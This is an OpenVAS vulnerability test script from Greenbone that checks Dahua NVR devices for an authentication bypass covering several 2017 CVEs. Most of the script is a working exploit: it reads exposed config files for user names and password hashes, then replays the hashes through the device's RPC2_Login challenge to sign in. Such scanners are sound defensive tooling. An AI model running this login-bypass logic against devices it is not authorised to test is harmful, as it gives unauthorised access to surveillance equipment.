###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dahua_auth_bypass_03_17.nasl 11993 2018-10-19 15:20:00Z tpassfeld $
#
# Dahua Devices Authentication Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:dahua:nvr';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140185");
  script_version("$Revision: 11993 $");
  script_cve_id("CVE-2017-6343", "CVE-2017-7253", "CVE-2017-7927", "CVE-2017-7925",
               "CVE-2017-6432", "CVE-2017-6341", "CVE-2017-6342");
  script_bugtraq_id(96449, 96454, 96456, 98312, 98312, 97263);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Dahua Devices Authentication Bypass Vulnerability");

  script_xref(name:"URL", value:"http://www.dahuasecurity.com/en/us/uploads/Dahua%20Technology%20Vulnerability%20030617v2.pdf");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2017/Mar/7");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/96449");
  script_xref(name:"URL", value:"https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html");

  script_tag(name:"impact", value:"An attacker can exploit this issue to bypass authentication mechanism and perform unauthorized actions. This may lead to further attacks.");
  script_tag(name:"vuldetect", value:"Try to login into the remote device.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The remote Dahua device is prone to an authentication-bypass vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-10-19 17:20:00 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-03-14 14:30:19 +0100 (Tue, 14 Mar 2017)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("gb_dahua_devices_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dahua/device/detected");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

function do_login( generation, buf )
{
  if( ! generation || ! buf ) return;

  if( generation == "GEN3" )
    return do_gen_3_login( buf:buf );
  else
    return do_gen_2_login( buf:buf );
}

function do_gen_3_login( buf )
{
  local_var lines, i, buf, pw_hash, pass, pdata, id, r, random, user, lpass, a, s, session, AL, alen;

  if( ! buf ) return;

  lines = split( buf, sep:'"Users" : [', keep:FALSE );
  if( isnull( lines[1] ) )
    return;

  lines = split( lines[1] );

  for( i = 0; i < max_index( lines ); i++ )
  {
    user    = '';
    pw_hash = '';
    AL      = FALSE;
    alen    = 0;

    if( '"Name" :' >< lines[ i ] && "Password" >< lines[ i + 1 ] )
    {
      u = eregmatch( pattern:'"Name"\\s*:\\s*"([^"]+)"', string:lines[ i ] );
      if( isnull( u[1] ) )
        continue;

      user = u[1];

      pass = eregmatch( pattern:'"Password"\\s*:\\s* "([^"]+)"', string:lines[ i + 1 ] );
      if( isnull( pass[1] ) )
        continue;

      pw_hash = pass[1];
    }

    if( ! pw_hash )
      continue;

    id = "1" + rand_str( length:4, charset:"1234567890" );
    pdata = '{"params": {"userName": "' + user + '", "password": "", "clientType": "Web3.0"}, "method": "global.login", "id": ' + id + '}';

    req = http_post_req( port:port,
                         url:'/RPC2_Login',
                         data:pdata,
                         add_headers: make_array( 'X-Request', 'JSON',
                                                  'X-Requested-With', 'XMLHttpRequest',
                                                  'Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8') );

    recv = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

    if( "random" >!< recv || id >!< recv || "session" >!< recv )
      continue;

    r = eregmatch( pattern:'"random"\\s*:\\s*"([^"]+)"', string:recv );
    if( isnull( r[1] ) )
      continue;

    random = r[1];

    s =  eregmatch( pattern:'"session"\\s*:\\s*([0-9]+)', string:recv );
    if( isnull( s[1] ) )
      continue;

    session = s[1];

    lpass = '' + user + ':' + random + ':' + pw_hash;
    random_hash = toupper( hexstr( MD5( lpass ) ) );


    pdata = '{"session": ' + session + ', "params": {"userName": "' + user + '", "authorityType": "Default", "password": "' + random_hash  + '", "clientType": "Web3.0"}, "method": "global.login", "id": ' + id + '}';
    req = http_post_req( port:port,
                         url:'/RPC2_Login',
                         data:pdata,
                         add_headers: make_array( 'X-Request', 'JSON',
                                                  'X-Requested-With', 'XMLHttpRequest',
                                                  'Dhwebclientsessionid', session,
                                                  'Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8') );

    recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( recv =~ "HTTP/1\.. 200" && recv =~ '"result"\\s*:\\s*true' && "Component error" >!< recv )
    {
      pdata = '{"session": ' + session + ', "params": "null", "method": "global.logout", "id": ' + id + '}';
      req = http_post_req( port:port,
                           url:'/RPC2_Login',
                           data:pdata,
                           add_headers: make_array( 'X-Request', 'JSON',
                                                    'X-Requested-With', 'XMLHttpRequest',
                                                    'Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8') );

      recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

      return user;
    }
  }
  return;
}

function do_gen_2_login( buf )
{
  local_var user, pass, lines, line, ld, id, pdata, req, recv, s, session;
  if( ! buf )
    return;

  lines = split( buf );

  foreach line ( lines )
  {
    if( line =~ "^#" || strlen( line ) < 4 )
      continue;

    user = FALSE;
    pass = FALSE;

    ld = split( line, sep:":", keep:FALSE );
    if( max_index( ld ) < 6 )
      continue;

    user = ld[1];
    pass = ld[2];

    if( ! user || ! pass )
      continue;

    id = '1' + rand_str( charset:"1234567890", length:4 );

    pdata = '{"params": {"userName": "' + user + '", "password": "", "clientType": "Web3.0"}, "method": "global.login", "id": ' + id + '}';
    req = http_post_req( port:port,
                       url:'/RPC2_Login',
                       data:pdata,
                       add_headers: make_array( 'X-Request', 'JSON',
                                                'X-Requested-With', 'XMLHttpRequest',
                                                'Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8') );

    recv = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );


    s =  eregmatch( pattern:'"session"\\s*:\\s*([0-9]+)', string:recv );
    if( isnull( s[1] ) )
      continue;

    session = s[1];

    pdata = '{"session": ' + session + ', "params": {"userName": "' + user + '", "authorityType": "OldDigest", "password": "' + pass  + '", "clientType": "Web3.0"}, "method": "global.login", "id": ' + id + '}';
    req = http_post_req( port:port,
                         url:'/RPC2_Login',
                         data:pdata,
                         add_headers: make_array( 'X-Request', 'JSON',
                                                  'X-Requested-With', 'XMLHttpRequest',
                                                  'Dhwebclientsessionid', session,
                                                  'Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8') );

    recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( recv =~ "HTTP/1\.. 200" && recv =~ '"result"\\s*:\\s*true' && "Component error" >!< recv )
    {
      pdata = '{"session": ' + session + ', "params": "null", "method": "global.logout", "id": ' + id + '}';
      req = http_post_req( port:port,
                           url:'/RPC2_Login',
                           data:pdata,
                           add_headers: make_array( 'X-Request', 'JSON',
                                                    'X-Requested-With', 'XMLHttpRequest',
                                                    'Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8') );

      recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

      return user;
    }

  }

  return;
}

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

urls = make_array();

urls[ '/current_config/Account1' ] = make_list( 'GEN3', '"DevInformation" : \\{' );
urls[ '/current_config/passwd'   ] = make_list( 'GEN2', 'id:name:passwd:groupid:' );

foreach url ( keys( urls ) )
{
  req = http_get( item:url, port:port );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf !~ "HTTP/1\.. 200" )
    continue;

  pattern = '';
  generation = '';

  d = urls[ url ];

  pattern = d[ 1 ];
  generation = d[ 0 ];

  if( eregmatch( pattern:pattern, string:buf  ) )
  {
    if( user = do_login( generation:generation, buf:buf ) )
    {
      report = 'It was possible to read user and password from `' + report_vuln_url( port:port, url:url, url_only:TRUE ) + '` and to login\ninto the remote Dahua device as user `' + user + '`.\n';
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
